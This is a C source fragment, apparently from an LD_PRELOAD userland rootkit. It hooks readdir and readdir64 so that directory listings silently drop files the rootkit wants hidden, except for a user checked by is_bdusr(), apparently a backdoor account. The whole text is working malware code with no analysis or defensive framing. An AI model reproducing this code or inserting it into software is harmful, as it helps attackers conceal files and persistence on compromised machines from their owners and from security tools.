struct dirent *readdir(DIR *dirp){
    char path[PATH_MAX];
    struct dirent *dir;

    hook(CREADDIR);

    do{
        dir = call(CREADDIR, dirp);
        if(is_bdusr()) return dir;
        if(dir == NULL || is_blacklisted(dir->d_name)) continue;
        snprintf(path, sizeof(path), "%s/%s", gdirname(dirp), dir->d_name);
    }while(dir && hidden_path(path));

    return dir;
}

struct dirent64 *readdir64(DIR *dirp){
    char path[PATH_MAX];
    struct dirent64 *dir;

    hook(CREADDIR64);

    do{
        dir = call(CREADDIR64, dirp);
        if(is_bdusr()) return dir;
        if(dir == NULL || is_blacklisted(dir->d_name)) continue;
        snprintf(path, sizeof(path), "%s/%s", gdirname(dirp), dir->d_name);
    }while(dir && hidden_path(path));

    return dir;
}
